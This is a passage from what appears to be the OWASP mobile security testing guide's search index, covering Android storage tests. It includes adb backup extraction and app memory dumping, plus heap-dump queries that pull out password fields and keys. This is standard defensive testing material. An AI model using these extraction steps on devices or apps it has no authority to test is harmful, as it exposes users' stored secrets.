<code>numberPassword</code> <code>TYPE_NUMBER_VARIATION_PASSWORD</code> 11 <code>textWebPassword</code> <code>TYPE_TEXT_VARIATION_WEB_PASSWORD</code> 11 <p>Check the application code to verify that none of the input types are being overwritten. For example, by doing <code>findViewById(R.id.KeyBoardCache).setInputType(InputType.TYPE_CLASS_TEXT)</code> the input type of the input field <code>KeyBoardCache</code> is set to <code>text</code> reenabling the keyboard cache.</p> <p>Finally, check the minimum required SDK version in the Android Manifest (<code>android:minSdkVersion</code>) since it must support the used constants (for example, Android SDK version 11 is required for <code>textWebPassword</code>). Otherwise, the compiled app would not honor the used input type constants allowing keyboard caching.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0006/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Start the app and click in the input fields that take sensitive data. If strings are suggested, the keyboard cache has not been disabled for these fields.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-5","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0009/","title":"MASTG-TEST-0009: Testing Backups for Sensitive Data","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: </p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> Sensitive Data Not Excluded From Backup</li> </ul>","tags":["android","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0009/#overview","title":"Overview","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0009/#static-analysis","title":"Static Analysis","text":"","tags":["android","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0009/#local","title":"Local","text":"<p>Check the <code>AndroidManifest.xml</code> file for the following flag:</p> <pre><code>android:allowBackup=\"true\"\n</code></pre> <p>If the flag value is true, determine whether the app saves any kind of sensitive data (check the test case \"Testing for Sensitive Data in Local Storage\").</p>","tags":["android","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0009/#cloud","title":"Cloud","text":"<p>Regardless of whether you use key/value backup or auto backup, you must determine the following:</p> <ul> <li>which files are sent to the cloud (e.g., SharedPreferences)</li> <li>whether the files contain sensitive information</li> <li>whether sensitive information is encrypted before being sent to the cloud.</li> </ul> <p>If you don't want to share files with Google Cloud, you can exclude them from Auto Backup. Sensitive information stored at rest on the device should be encrypted before being sent to the cloud.</p> <ul> <li>Auto Backup: You configure Auto Backup via the boolean attribute <code>android:allowBackup</code> within the application's manifest file. Auto Backup is enabled by default for applications that target Android 6.0 (API level 23). You can use the attribute <code>android:fullBackupOnly</code> to activate auto backup when implementing a backup agent, but this attribute is available for Android versions 6.0 and above only. Other Android versions use key/value backup instead.</li> </ul> <pre><code>android:fullBackupOnly\n</code></pre> <p>Auto backup includes almost all the app files and stores up 25 MB of them per app in the user's Google Drive account. Only the most recent backup is stored; the previous backup is deleted.</p> <ul> <li>Key/Value Backup: To enable key/value backup, you must define the backup agent in the manifest file. Look in <code>AndroidManifest.xml</code> for the following attribute:</li> </ul> <pre><code>android:backupAgent\n</code></pre> <p>To implement key/value backup, extend one of the following classes:</p> <ul> <li>BackupAgent</li> <li>BackupAgentHelper</li> </ul> <p>To check for key/value backup implementations, look for these classes in the source code.</p>","tags":["android","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0009/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>After executing all available app functions, attempt to back up via <code>adb</code>. If the backup is successful, inspect the backup archive for sensitive data. Open a terminal and run the following command:</p> <pre><code>adb backup -apk -nosystem &lt;package-name&gt;\n</code></pre> <p>ADB should respond now with \"Now unlock your device and confirm the backup operation\" and you should be asked on the Android phone for a password. This is an optional step and you don't need to provide one. If the phone does not prompt this message, try the following command including the quotes:</p> <pre><code>adb backup \"-apk -nosystem &lt;package-name&gt;\"\n</code></pre> <p>The problem happens when your device has an adb version prior to 1.0.31. If that's the case you must use an adb version of 1.0.31 also on your host computer. Versions of adb after 1.0.32 broke the backwards compatibility.</p> <p>Approve the backup from your device by selecting the Back up my data option. After the backup process is finished, the file .ab will be in your working directory. Run the following command to convert the .ab file to tar.</p> <pre><code>tail -c +25 backup.ab |openssl zlib -d &gt; backup.tar\n</code></pre> <p>In case you get the error <code>openssl:Error: 'zlib' is an invalid command.</code> you can try to use Python instead.</p> <pre><code>tail -c +25 backup.ab | python -c \"import zlib,sys;sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))\" &gt; backup.tar\n</code></pre> <p>The Android Backup Extractor is another alternative backup tool. To make the tool to work, you have to download the Oracle JCE Unlimited Strength Jurisdiction Policy Files for JRE7 or JRE8 and place them in the JRE lib/security folder. Run the following command to convert the tar file:</p> <pre><code>java -jar abe.jar unpack backup.ab\n</code></pre> <p>if it shows some Cipher information and usage, which means it hasn't unpacked successfully. In this case you can give a try with more arguments:</p> <pre><code>abe [-debug] [-useenv=yourenv] unpack &lt;backup.ab&gt; &lt;backup.tar&gt; [password]\n</code></pre> <p><code>[password]</code> is the password when your android device asked you earlier. For example here is: 123</p> <pre><code>java -jar abe.jar unpack backup.ab backup.tar 123\n</code></pre> <p>Extract the tar file to your working directory.</p> <pre><code>tar xvf backup.tar\n</code></pre>","tags":["android","L1","L2","test","MSTG-STORAGE-8","masvs-storage-2","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/","title":"MASTG-TEST-0011: Testing Memory for Sensitive Data","text":"<p>This test will be updated soon</p> <p>The test can be used in its current form, but it will receive a complete overhaul as part of the new OWASP MASTG v2 guidelines.</p> <p>Help us out by submitting a PR for: MASTG v1-&gt;v2 MASTG-TEST-0011: Testing Memory for Sensitive Data (android)</p> <p> Send Feedback</p>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/#overview","title":"Overview","text":"<p>Analyzing memory can help developers identify the root causes of several problems, such as application crashes. However, it can also be used to access sensitive data. This section describes how to check for data disclosure via process memory.</p> <p>First identify sensitive information that is stored in memory. Sensitive assets have likely been loaded into memory at some point. The objective is to verify that this information is exposed as briefly as possible.</p> <p>To investigate an application's memory, you must first create a memory dump. You can also analyze the memory in real-time, e.g., via a debugger. Regardless of your approach, memory dumping is a very error-prone process in terms of verification because each dump contains the output of executed functions. You may miss executing critical scenarios. In addition, overlooking data during analysis is probable unless you know the data's footprint (either the exact value or the data format). For example, if the app encrypts with a randomly generated symmetric key, you likely won't be able to spot it in memory unless you can recognize the key's value in another context.</p> <p>Therefore, you are better off starting with static analysis.</p>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/#static-analysis","title":"Static Analysis","text":"<p>When performing static analysis to identify sensitive data that is exposed in memory, you should:</p> <ul> <li>Try to identify application components and map where data is used.</li> <li>Make sure that sensitive data is handled by as few components as possible.</li> <li>Make sure that object references are properly removed once the object containing the sensitive data is no longer needed.</li> <li>Make sure that garbage collection is requested after references have been removed.</li> <li>Make sure that sensitive data gets overwritten as soon as it is no longer needed.<ul> <li>Don't represent such data with immutable data types (such as <code>String</code> and <code>BigInteger</code>).</li> <li>Avoid non-primitive data types (such as <code>StringBuilder</code>).</li> <li>Overwrite references before removing them, outside the <code>finalize</code> method.</li> <li>Pay attention to third-party components (libraries and frameworks).   Public APIs are good indicators. Determine whether the public API handles the sensitive data as described in this chapter.</li> </ul> </li> </ul> <p>The following section describes pitfalls of data leakage in memory and best practices for avoiding them.</p> <p>Don't use immutable structures (e.g., <code>String</code> and <code>BigInteger</code>) to represent secrets. Nullifying these structures will be ineffective: the garbage collector may collect them, but they may remain on the heap after garbage collection. Nevertheless, you should ask for garbage collection after every critical operation (e.g., encryption, parsing server responses that contain sensitive information). When copies of the information have not been properly cleaned (as explained below), your request will help reduce the length of time for which these copies are available in memory.</p> <p>To properly clean sensitive information from memory, store it in primitive data types, such as byte-arrays (<code>byte[]</code>) and char-arrays (<code>char[]</code>). You should avoid storing the information in mutable non-primitive data types.</p> <p>Make sure to overwrite the content of the critical object once the object is no longer needed. Overwriting the content with zeroes is one simple and very popular method:</p> <p>Example in Java:</p> <pre><code>byte[] secret = null;\ntry{\n    //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        Arrays.fill(secret, (byte) 0);\n    }\n}\n</code></pre> <p>Example in Kotlin:</p> <pre><code>val secret: ByteArray? = null\ntry {\n     //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        Arrays.fill(secret, 0.toByte())\n    }\n}\n</code></pre> <p>This doesn't, however, guarantee that the content will be overwritten at runtime. To optimize the bytecode, the compiler will analyze and decide not to overwrite data because it will not be used afterwards (i.e., it is an unnecessary operation). Even if the code is in the compiled DEX, the optimization may occur during the just-in-time or ahead-of-time compilation in the VM.</p> <p>There is no silver bullet for this problem because different solutions have different consequences. For example, you may perform additional calculations (e.g., XOR the data into a dummy buffer), but you'll have no way to know the extent of the compiler's optimization analysis. On the other hand, using the overwritten data outside the compiler's scope (e.g., serializing it in a temp file) guarantees that it will be overwritten but obviously impacts performance and maintenance.</p> <p>Then, using <code>Arrays.fill</code> to overwrite the data is a bad idea because the method is an obvious hooking target (see  Method Hooking for more details).</p> <p>The final issue with the above example is that the content was overwritten with zeroes only. You should try to overwrite critical objects with random data or content from non-critical objects. This will make it really difficult to construct scanners that can identify sensitive data on the basis of its management.</p> <p>Below is an improved version of the previous example:</p> <p>Example in Java:</p> <pre><code>byte[] nonSecret = somePublicString.getBytes(\"ISO-8859-1\");\nbyte[] secret = null;\ntry{\n    //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        for (int i = 0; i &lt; secret.length; i++) {\n            secret[i] = nonSecret[i % nonSecret.length];\n        }\n\n        FileOutputStream out = new FileOutputStream(\"/dev/null\");\n        out.write(secret);\n        out.flush();\n        out.close();\n    }\n}\n</code></pre> <p>Example in Kotlin:</p> <pre><code>val nonSecret: ByteArray = somePublicString.getBytes(\"ISO-8859-1\")\nval secret: ByteArray? = null\ntry {\n     //get or generate the secret, do work with it, make sure you make no local copies\n} finally {\n    if (null != secret) {\n        for (i in secret.indices) {\n            secret[i] = nonSecret[i % nonSecret.size]\n        }\n\n        val out = FileOutputStream(\"/dev/null\")\n        out.write(secret)\n        out.flush()\n        out.close()\n        }\n}\n</code></pre> <p>For more information, take a look at Securely Storing Sensitive Data in RAM.</p> <p>In the \"Static Analysis\" section, we mentioned the proper way to handle cryptographic keys when you are using <code>AndroidKeyStore</code> or <code>SecretKey</code>.</p> <p>For a better implementation of <code>SecretKey</code>, look at the <code>SecureSecretKey</code> class below. Although the implementation is probably missing some boilerplate code that would make the class compatible with <code>SecretKey</code>, it addresses the main security concerns:</p> <ul> <li>No cross-context handling of sensitive data. Each copy of the key can be cleared from within the scope in which it was created.</li> <li>The local copy is cleared according to the recommendations given above.</li> </ul> <p>Example in Java:</p> <pre><code>  public class SecureSecretKey implements javax.crypto.SecretKey, Destroyable {\n      private byte[] key;\n      private final String algorithm;\n\n      /** Constructs SecureSecretKey instance out of a copy of the provided key bytes.\n        * The caller is responsible of clearing the key array provided as input.\n        * The internal copy of the key can be cleared by calling the destroy() method.\n        */\n      public SecureSecretKey(final byte[] key, final String algorithm) {\n          this.key = key.clone();\n          this.algorithm = algorithm;\n      }\n\n      public String getAlgorithm() {\n          return this.algorithm;\n      }\n\n      public String getFormat() {\n          return \"RAW\";\n      }\n\n      /** Returns a copy of the key.\n        * Make sure to clear the returned byte array when no longer needed.\n        */\n      public byte[] getEncoded() {\n          if(null == key){\n              throw new NullPointerException();\n          }\n\n          return key.clone();\n      }\n\n      /** Overwrites the key with dummy data to ensure this copy is no longer present in memory.*/\n      public void destroy() {\n          if (isDestroyed()) {\n              return;\n          }\n\n          byte[] nonSecret = new String(\"RuntimeException\").getBytes(\"ISO-8859-1\");\n          for (int i = 0; i &lt; key.length; i++) {\n            key[i] = nonSecret[i % nonSecret.length];\n          }\n\n          FileOutputStream out = new FileOutputStream(\"/dev/null\");\n          out.write(key);\n          out.flush();\n          out.close();\n\n          this.key = null;\n          System.gc();\n      }\n\n      public boolean isDestroyed() {\n          return key == null;\n      }\n  }\n</code></pre> <p>Example in Kotlin:</p> <pre><code>class SecureSecretKey(key: ByteArray, algorithm: String) : SecretKey, Destroyable {\n    private var key: ByteArray?\n    private val algorithm: String\n    override fun getAlgorithm(): String {\n        return algorithm\n    }\n\n    override fun getFormat(): String {\n        return \"RAW\"\n    }\n\n    /** Returns a copy of the key.\n     * Make sure to clear the returned byte array when no longer needed.\n     */\n    override fun getEncoded(): ByteArray {\n        if (null == key) {\n            throw NullPointerException()\n        }\n        return key!!.clone()\n    }\n\n    /** Overwrites the key with dummy data to ensure this copy is no longer present in memory. */\n    override fun destroy() {\n        if (isDestroyed) {\n            return\n        }\n        val nonSecret: ByteArray = String(\"RuntimeException\").toByteArray(charset(\"ISO-8859-1\"))\n        for (i in key!!.indices) {\n            key!![i] = nonSecret[i % nonSecret.size]\n        }\n        val out = FileOutputStream(\"/dev/null\")\n        out.write(key)\n        out.flush()\n        out.close()\n        key = null\n        System.gc()\n    }\n\n    override fun isDestroyed(): Boolean {\n        return key == null\n    }\n\n    /** Constructs SecureSecretKey instance out of a copy of the provided key bytes.\n     * The caller is responsible of clearing the key array provided as input.\n     * The internal copy of the key can be cleared by calling the destroy() method.\n     */\n    init {\n        this.key = key.clone()\n        this.algorithm = algorithm\n    }\n}\n</code></pre> <p>Secure user-provided data is the final secure information type usually found in memory. This is often managed by implementing a custom input method, for which you should follow the recommendations given here. However, Android allows information to be partially erased from <code>EditText</code> buffers via a custom <code>Editable.Factory</code>.</p> <pre><code>EditText editText = ...; //  point your variable to your EditText instance\nEditText.setEditableFactory(new Editable.Factory() {\n  public Editable newEditable(CharSequence source) {\n  ... // return a new instance of a secure implementation of Editable.\n  }\n});\n</code></pre> <p>Refer to the <code>SecureSecretKey</code> example above for an example <code>Editable</code> implementation. Note that you will be able to securely handle all copies made by <code>editText.getText</code> if you provide your factory. You can also try to overwrite the internal <code>EditText</code> buffer by calling <code>editText.setText</code>, but there is no guarantee that the buffer will not have been copied already. If you choose to rely on the default input method and <code>EditText</code>, you will have no control over the keyboard or other components that are used. Therefore, you should use this approach for semi-confidential information only.</p> <p>In all cases, make sure that sensitive data in memory is cleared when a user signs out of the application. Finally, make sure that highly sensitive information is cleared out the moment an Activity or Fragment's <code>onPause</code> event is triggered.</p> <p>Note that this might mean that a user has to re-authenticate every time the application resumes.</p>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>Static analysis will help you identify potential problems, but it can't provide statistics about how long data has been exposed in memory, nor can it help you identify problems in closed-source dependencies. This is where dynamic analysis comes into play.</p> <p>There are various ways to analyze the memory of a process, e.g. live analysis via a debugger/dynamic instrumentation and analyzing one or more memory dumps.</p>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/#retrieving-and-analyzing-a-memory-dump","title":"Retrieving and Analyzing a Memory Dump","text":"<p>Whether you are using a rooted or a non-rooted device, you can dump the app's process memory with  objection and  Fridump. You can find a detailed explanation of this process in  Process Exploration, in the chapter \"Tampering and Reverse Engineering on Android\".</p> <p>After the memory has been dumped (e.g. to a file called \"memory\"), depending on the nature of the data you're looking for, you'll need a set of different tools to process and analyze that memory dump. For instance, if you're focusing on strings, it might be sufficient for you to execute the command <code>strings</code> or <code>rabin2 -zz</code> from  rabin2 to extract those strings.</p> <pre><code># using strings\n$ strings memory &gt; strings.txt\n\n# using rabin2\n$ rabin2 -ZZ memory &gt; strings.txt\n</code></pre> <p>Open <code>strings.txt</code> in your favorite editor and dig through it to identify sensitive information.</p> <p>However if you'd like to inspect other kind of data, you'd rather want to use radare2 and its search capabilities. See radare2's help on the search command (<code>/?</code>) for more information and a list of options. The following shows only a subset of them:</p> <pre><code>$ r2 &lt;name_of_your_dump_file&gt;\n\n[0x00000000]&gt; /?\nUsage: /[!bf] [arg]  Search stuff (see 'e??search' for options)\n|Use io.va for searching in non virtual addressing spaces\n| / foo\\x00                    search for string 'foo\\0'\n| /c[ar]                       search for crypto materials\n| /e /E.F/i                    match regular expression\n| /i foo                       search for string 'foo' ignoring case\n| /m[?][ebm] magicfile         search for magic, filesystems or binary headers\n| /v[1248] value               look for an `cfg.bigendian` 32bit value\n| /w foo                       search for wide string 'f\\0o\\0o\\0'\n| /x ff0033                    search for hex string\n| /z min max                   search for strings of given size\n...\n</code></pre>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/#runtime-memory-analysis","title":"Runtime Memory Analysis","text":"<p>Instead of dumping the memory to your host computer, you can alternatively use  r2frida. With it, you can analyze and inspect the app's memory while it's running. For example, you may run the previous search commands from r2frida and search the memory for a string, hexadecimal values, etc. When doing so, remember to prepend the search command (and any other r2frida specific commands) with a backslash <code>:</code> after starting the session with <code>r2 frida://usb//&lt;name_of_your_app&gt;</code>.</p> <p>For more information, options and approaches, please refer to  Process Exploration for more information.</p>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0011/#explicitly-dumping-and-analyzing-the-java-heap","title":"Explicitly Dumping and Analyzing the Java Heap","text":"<p>For rudimentary analysis, you can use Android Studio's built-in tools. They are on the Android Monitor tab. To dump memory, select the device and app you want to analyze and click Dump Java Heap. This will create a .hprof file in the captures directory, which is on the app's project path.</p> <p></p> <p>To navigate through class instances that were saved in the memory dump, select the Package Tree View in the tab showing the .hprof file.</p> <p></p> <p>For more advanced analysis of the memory dump, use the Eclipse Memory Analyzer Tool (MAT). It is available as an Eclipse plugin and as a standalone application.</p> <p>To analyze the dump in MAT, use the hprof-conv platform tool, which comes with the Android SDK.</p> <pre><code>./hprof-conv memory.hprof memory-mat.hprof\n</code></pre> <p>MAT provides several tools for analyzing the memory dump. For example, the Histogram provides an estimate of the number of objects that have been captured from a given type, and the Thread Overview shows processes' threads and stack frames. The Dominator Tree provides information about keep-alive dependencies between objects. You can use regular expressions to filter the results these tools provide.</p> <p>Object Query Language studio is a MAT feature that allows you to query objects from the memory dump with an SQL-like language. The tool allows you to transform simple objects by invoking Java methods on them, and it provides an API for building sophisticated tools on top of the MAT.</p> <pre><code>SELECT * FROM java.lang.String\n</code></pre> <p>In the example above, all <code>String</code> objects present in the memory dump will be selected. The results will include the object's class, memory address, value, and retain count. To filter this information and see only the value of each string, use the following code:</p> <pre><code>SELECT toString(object) FROM java.lang.String object\n</code></pre> <p>Or</p> <pre><code>SELECT object.toString() FROM java.lang.String object\n</code></pre> <p>SQL supports primitive data types as well, so you can do something like the following to access the content of all <code>char</code> arrays:</p> <pre><code>SELECT toString(arr) FROM char[] arr\n</code></pre> <p>Don't be surprised if you get results that are similar to the previous results; after all, <code>String</code> and other Java data types are just wrappers around primitive data types. Now let's filter the results. The following sample code will select all byte arrays that contain the ASN.1 OID of an RSA key. This doesn't imply that a given byte array actually contains an RSA (the same byte sequence may be part of something else), but this is probable.</p> <pre><code>SELECT * FROM byte[] b WHERE toString(b).matches(\".*1\\.2\\.840\\.113549\\.1\\.1\\.1.*\")\n</code></pre> <p>Finally, you don't have to select whole objects. Consider an SQL analogy: classes are tables, objects are rows, and fields are columns. If you want to find all objects that have a \"password\" field, you can do something like the following:</p> <pre><code>SELECT password FROM \".*\" WHERE (null != password)\n</code></pre> <p>During your analysis, search for:</p> <ul> <li>Indicative field names: \"password\", \"pass\", \"pin\", \"secret\", \"private\", etc.</li> <li>Indicative patterns (e.g., RSA footprints) in strings, char arrays, byte arrays, etc.</li> <li>Known secrets (e.g., a credit card number that you've entered or an authentication token provided by the backend)</li> <li>etc.</li> </ul> <p>Repeating tests and memory dumps will help you obtain statistics about the length of data exposure. Furthermore, observing the way a particular memory segment (e.g., a byte array) changes may lead you to some otherwise unrecognizable sensitive data (more on this in the \"Remediation\" section below).</p>","tags":["android","L2","test","MSTG-STORAGE-10","masvs-storage-2"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0012/","title":"MASTG-TEST-0012: Testing the Device-Access-Security Policy","text":"<p>Deprecated Test</p> <p>This test is deprecated and should not be used anymore. Reason: New version available in MASTG V2</p> <p>Please check the following MASTG v2 tests that cover this v1 test:</p> <ul> <li> References to APIs for Detecting Secure Screen Lock</li> <li> Runtime Use of Secure Screen Lock Detection APIs</li> </ul>","tags":["android","L2","test","MSTG-STORAGE-11","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0012/#overview","title":"Overview","text":"<p>Apps that process or query sensitive information should run in a trusted and secure environment. To create this environment, the app can check the device for the following:</p> <ul> <li>PIN- or password-protected device locking</li> <li>Recent Android OS version</li> <li>USB Debugging activation</li> <li>Device encryption</li> <li>Device rooting (see also \"Testing Root Detection\")</li> </ul>","tags":["android","L2","test","MSTG-STORAGE-11","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0012/#static-analysis","title":"Static Analysis","text":"<p>To test the device-access-security policy that the app enforces, a written copy of the policy must be provided. The policy should define available checks and their enforcement. For example, one check could require that the app run only on Android 6.0 (API level 23) or a more recent version, closing the app or displaying a warning if the Android version is less than 6.0.</p> <p>Check the source code for functions that implement the policy and determine whether it can be bypassed.</p> <p>You can implement checks on the Android device by querying Settings.Secure for system preferences. Device Administration API offers techniques for creating applications that can enforce password policies and device encryption.</p>","tags":["android","L2","test","MSTG-STORAGE-11","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0012/#dynamic-analysis","title":"Dynamic Analysis","text":"<p>The dynamic analysis depends on the checks enforced by the app and their expected behavior. If the checks can be bypassed, they must be validated.</p>","tags":["android","L2","test","MSTG-STORAGE-11","masvs-storage-1","deprecated"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0200/","title":"MASTG-TEST-0200: Files Written to External Storage","text":"","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0200/#overview","title":"Overview","text":"<p>The goal of this test is to retrieve the files written to the external storage ( External Storage) and inspect them regardless of the APIs used to write them. It uses a simple approach based on file retrieval from the device storage ( Host-Device Data Transfer) before and after the app is exercised to identify the files created during the app's execution and to check if they contain sensitive data.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0200/#steps","title":"Steps","text":"<ol> <li>Make sure you have  adb installed.</li> <li>Install the app ( Installing Apps).</li> <li>Before running the app, get the current list of files ( Host-Device Data Transfer) in the external storage.</li> <li>Exercise the app.</li> <li>After running the app, retrieve the list of files in the external storage again.</li> <li>Calculate the difference between the two lists.</li> </ol>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0200/#observation","title":"Observation","text":"<p>The output should contain a list of files that were created on the external storage during the app's execution.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0200/#evaluation","title":"Evaluation","text":"<p>The test case fails if the files found above are not encrypted and leak sensitive data.</p> <p>To confirm this, you can reverse engineer the app( Decompiling Java Code) and inspect the code( Reviewing Decompiled Java Code).</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0200/#demos","title":"Demos","text":"<p> MASTG-DEMO-0001: File System Snapshots from External Storage </p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0201/","title":"MASTG-TEST-0201: Runtime Use of APIs to Access External Storage","text":"","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0201/#overview","title":"Overview","text":"<p>Android apps use a variety of APIs to access the external storage. Collecting a comprehensive list of these APIs can be challenging, especially if an app uses a third-party framework, loads code at runtime, or includes native code. The most effective approach to testing applications that write to device storage is usually dynamic analysis, and specifically method tracing ( Method Tracing).</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0201/#steps","title":"Steps","text":"<ol> <li>Make sure you have  Frida for Android installed.</li> <li>Install the app.</li> <li>Execute a script to spawn the app with Frida and log all interactions with files.</li> <li>Navigate to the screen of the app that you want to analyse.</li> <li>Close the app to stop Frida.</li> </ol> <p>The Frida script should log all file interactions by hooking into the relevant APIs such as <code>getExternalStorageDirectory</code>, <code>getExternalStoragePublicDirectory</code>, <code>getExternalFilesDir</code> or <code>FileOutPutStream</code>. You could also use <code>open</code> as a catch-all for file interactions. However, this won't catch all file interactions, such as those that use the <code>MediaStore</code> API and should be done with additional filtering as it can generate a lot of noise.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0201/#observation","title":"Observation","text":"<p>The output should contain a list of files that the app wrote to the external storage during execution and, if possible, the APIs used to write them.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0201/#evaluation","title":"Evaluation","text":"<p>The test case fails if the files found above are not encrypted and leak sensitive data.</p> <p>To confirm this, you can manually inspect the files using adb shell ( Host-Device Data Transfer) to retrieve them from the device, and reverse engineer the app ( Decompiling Java Code) and inspect the code ( Reviewing Decompiled Java Code).</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0201/#demos","title":"Demos","text":"<p> MASTG-DEMO-0002: External Storage APIs Tracing with Frida </p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/","title":"MASTG-TEST-0202: References to APIs and Permissions for Accessing External Storage","text":"","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/#overview","title":"Overview","text":"<p>This test uses static analysis to look for uses of APIs allowing an app to write to locations that are shared with other apps ( Testing Local Storage for Sensitive Data) such as the external storage APIs or the <code>MediaStore</code> API as well as the relevant Android manifest storage-related permissions.</p> <p>This static test is great for identifying all code locations where the app is writing data to shared storage. However, it does not provide the actual data being written, and in some cases, the actual path in the device storage where the data is being written. Therefore, it is recommended to combine this test with others that take a dynamic approach, as this will provide a more complete view of the data being written to shared storage.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/#steps","title":"Steps","text":"<ol> <li>Reverse engineer the app ( Decompiling Java Code).</li> <li>Run a static analysis ( Static Analysis on Android) tool on the reverse engineered app targeting calls to any external storage APIs and Android manifest storage permissions.</li> </ol> <p>The static analysis tool should be able to identify all possible APIs and permissions used to write to shared storage, such as <code>getExternalStoragePublicDirectory</code>, <code>getExternalStorageDirectory</code>, <code>getExternalFilesDir</code>, <code>MediaStore</code>, <code>WRITE_EXTERNAL_STORAGE</code>, and <code>MANAGE_EXTERNAL_STORAGE</code>. See the Android documentation for more information on these APIs and permissions.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/#observation","title":"Observation","text":"<p>The output should contain a list of APIs and storage-related permissions used to write to shared storage and their code locations.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/#evaluation","title":"Evaluation","text":"<p>The test case fails if:</p> <ul> <li>the app has the proper permissions declared in the Android manifest (e.g. <code>WRITE_EXTERNAL_STORAGE</code>, <code>MANAGE_EXTERNAL_STORAGE</code>, etc.)</li> <li>and the data being written to shared storage is sensitive and not encrypted.</li> </ul> <p>To determine the latter, you may need to carefully review the reversed code ( Reviewing Decompiled Java Code) and/or combine this test with others that take a dynamic approach, as this will provide a more complete view of the data being written to shared storage.</p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/#references","title":"References","text":"<ul> <li>Manage all files on a storage device</li> <li>Access media files from shared storage</li> </ul>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0202/#demos","title":"Demos","text":"<p> MASTG-DEMO-0003: App Writing to External Storage without Scoped Storage Restrictions  MASTG-DEMO-0004: App Writing to External Storage with Scoped Storage Restrictions  MASTG-DEMO-0005: App Writing to External Storage via the MediaStore API </p>","tags":["android","L1","L2","test","MASWE-0007"]},{"location":"MASTG/tests/android/MASVS-STORAGE/MASTG-TEST-0203/","title":"MASTG-TEST-0203: Runtime Use of Logging 